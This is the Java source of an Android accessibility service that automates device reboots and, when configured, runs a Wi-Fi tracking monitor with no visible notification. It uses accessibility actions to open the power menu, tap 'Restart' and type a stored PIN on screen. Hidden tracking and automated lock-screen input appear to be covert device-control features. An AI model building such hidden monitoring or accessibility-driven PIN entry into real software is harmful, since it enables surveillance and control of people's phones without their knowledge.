package com.jpitsg.sysman;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public final class SystemManagerAccessibilityService extends AccessibilityService {
    private static volatile SystemManagerAccessibilityService instance;
    private static final String[] RESTART_TEXTS = new String[]{
            "Restart",
            "Reboot",
            "Restart phone",
            "Restart device"
    };

    private WifiChangeMonitor monitor;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean rebootRunning;
    private PowerManager.WakeLock rebootWakeLock;

    static void sync(Context context) {
        SystemManagerAccessibilityService service = instance;
        if (service != null) {
            service.syncMonitor();
            return;
        }

        Config config = Config.get(context);
        if (config.isTrackingEnabled()
                && config.postOnWifiChange()
                && !config.showWifiMonitorNotification()
                && !PermissionState.accessibilityServiceEnabled(context)) {
            LogStore.append(context, "accessibility", "Hidden Wi-Fi monitor needs Accessibility service enabled");
        }
    }

    static boolean requestReboot(Context context, String reason) {
        SystemManagerAccessibilityService service = instance;
        if (service == null) {
            LogStore.append(context, "reboot", "Accessibility service is not connected; cannot reboot reason=" + reason);
            return false;
        }
        service.startRebootSequence(reason);
        return true;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        monitor = new WifiChangeMonitor(this, "accessibility");
        LogStore.append(this, "accessibility", "Accessibility service connected");
        syncMonitor();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Reboot automation reads the active window only while a reboot sequence is running.
    }

    @Override
    public void onInterrupt() {
        LogStore.append(this, "accessibility", "Accessibility service interrupted");
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        rebootRunning = false;
        releaseWakeLock();
        if (monitor != null) {
            monitor.stop();
            monitor = null;
        }
        instance = null;
        LogStore.append(this, "accessibility", "Accessibility service destroyed");
        super.onDestroy();
    }

    private void syncMonitor() {
        if (monitor == null) {
            monitor = new WifiChangeMonitor(this, "accessibility");
        }
        Config config = Config.get(this);
        if (config.isTrackingEnabled() && config.postOnWifiChange() && !config.showWifiMonitorNotification()) {
            monitor.start();
        } else {
            monitor.stop();
        }
    }

    private void startRebootSequence(final String reason) {
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (rebootRunning) {
                    LogStore.append(SystemManagerAccessibilityService.this, "reboot", "Reboot automation already running; ignored reason=" + reason);
                    return;
                }
                rebootRunning = true;
                acquireWakeLock();

                LogStore.append(SystemManagerAccessibilityService.this, "reboot", "Starting reboot automation reason=" + reason);
                boolean opened = performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                LogStore.append(SystemManagerAccessibilityService.this, "reboot", "Power dialog global action result=" + opened);
                if (!opened) {
                    finishRebootSequence("power-dialog-failed");
                    return;
                }
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        clickRestart(1);
                    }
                }, Config.get(SystemManagerAccessibilityService.this).rebootPowerDialogWaitMs());
            }
        });
    }

    private void clickRestart(final int step) {
        boolean clicked = clickAnyText(RESTART_TEXTS, true);
        LogStore.append(this, "reboot", "Restart click step=" + step + " result=" + clicked);
        if (step < 2) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    clickRestart(step + 1);
                }
            }, Config.get(SystemManagerAccessibilityService.this).rebootStepWaitMs());
            return;
        }

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                enterPinSequence();
            }
        }, Config.get(SystemManagerAccessibilityService.this).rebootStepWaitMs());
    }

    private void enterPinSequence() {
        String sequence = Config.get(this).rebootPinSequence();
        if (sequence.isEmpty()) {
            LogStore.append(this, "reboot", "No reboot PIN sequence configured; automation finished after restart clicks");
            finishRebootSequence("restart-clicks-complete");
            return;
        }
        clickPinDigit(sequence, 0);
    }

    private void clickPinDigit(final String sequence, final int index) {
        if (index >= sequence.length()) {
            LogStore.append(this, "reboot", "PIN sequence entry complete length=" + sequence.length());
            finishRebootSequence("pin-complete");
            return;
        }

        char digit = sequence.charAt(index);
        if (!Character.isDigit(digit)) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    clickPinDigit(sequence, index + 1);
                }
            }, Config.get(SystemManagerAccessibilityService.this).rebootStepWaitMs());
            return;
        }

        boolean clicked = clickText(Character.toString(digit), false);
        LogStore.append(this, "reboot", "PIN digit index=" + index + " result=" + clicked);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                clickPinDigit(sequence, index + 1);
            }
        }, Config.get(SystemManagerAccessibilityService.this).rebootStepWaitMs());
    }

    private boolean clickAnyText(String[] texts, boolean contains) {
        for (String text : texts) {
            if (clickText(text, contains)) {
                return true;
            }
        }
        return false;
    }

    private boolean clickText(String text, boolean contains) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            LogStore.append(this, "reboot", "No active accessibility window while looking for text=" + text);
            return false;
        }
        try {
            return clickMatchingNode(root, text, contains);
        } catch (RuntimeException e) {
            LogStore.append(this, "reboot", "Click text failed text=" + text + " error=" + e.getMessage());
        } finally {
            root.recycle();
        }
        return false;
    }

    private boolean clickMatchingNode(AccessibilityNodeInfo node, String target, boolean contains) {
        if (node == null) {
            return false;
        }
        if ((matchesNodeText(node.getText(), target, contains)
                || matchesNodeText(node.getContentDescription(), target, contains))
                && clickNodeOrClickableParent(node)) {
            return true;
        }

        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            try {
                if (child != null && clickMatchingNode(child, target, contains)) {
                    return true;
                }
            } finally {
                if (child != null) {
                    child.recycle();
                }
            }
        }
        return false;
    }

    private boolean matchesNodeText(CharSequence value, String target, boolean contains) {
        if (value == null || target == null) {
            return false;
        }
        String candidate = value.toString().trim();
        if (candidate.isEmpty()) {
            return false;
        }
        if (contains) {
            return candidate.toLowerCase().contains(target.toLowerCase());
        }
        if (candidate.equals(target)) {
            return true;
        }
        return target.length() == 1
                && Character.isDigit(target.charAt(0))
                && (candidate.startsWith(target + " ") || candidate.startsWith(target + "\n"));
    }

    private boolean clickNodeOrClickableParent(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo current = AccessibilityNodeInfo.obtain(node);
        try {
            for (int i = 0; current != null && i < 8; i++) {
                if (current.isEnabled() && current.isClickable() && current.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true;
                }
                AccessibilityNodeInfo parent = current.getParent();
                current.recycle();
                current = parent;
            }
        } catch (RuntimeException e) {
            LogStore.append(this, "reboot", "Node click failed: " + e.getMessage());
        } finally {
            if (current != null) {
                current.recycle();
            }
        }
        return false;
    }

    @SuppressWarnings("deprecation")
    private void acquireWakeLock() {
        releaseWakeLock();
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager == null) {
            return;
        }
        try {
            rebootWakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
                    "SystemManager:reboot");
            rebootWakeLock.acquire(60_000L);
            LogStore.append(this, "reboot", "Wake lock acquired for reboot automation");
        } catch (RuntimeException e) {
            LogStore.append(this, "reboot", "Wake lock acquire failed: " + e.getMessage());
        }
    }

    private void finishRebootSequence(String result) {
        LogStore.append(this, "reboot", "Reboot automation sequence finished result=" + result);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                rebootRunning = false;
                releaseWakeLock();
            }
        }, 5000L);
    }

    private void releaseWakeLock() {
        if (rebootWakeLock != null) {
            try {
                if (rebootWakeLock.isHeld()) {
                    rebootWakeLock.release();
                }
            } catch (RuntimeException ignored) {
            }
            rebootWakeLock = null;
        }
    }
}
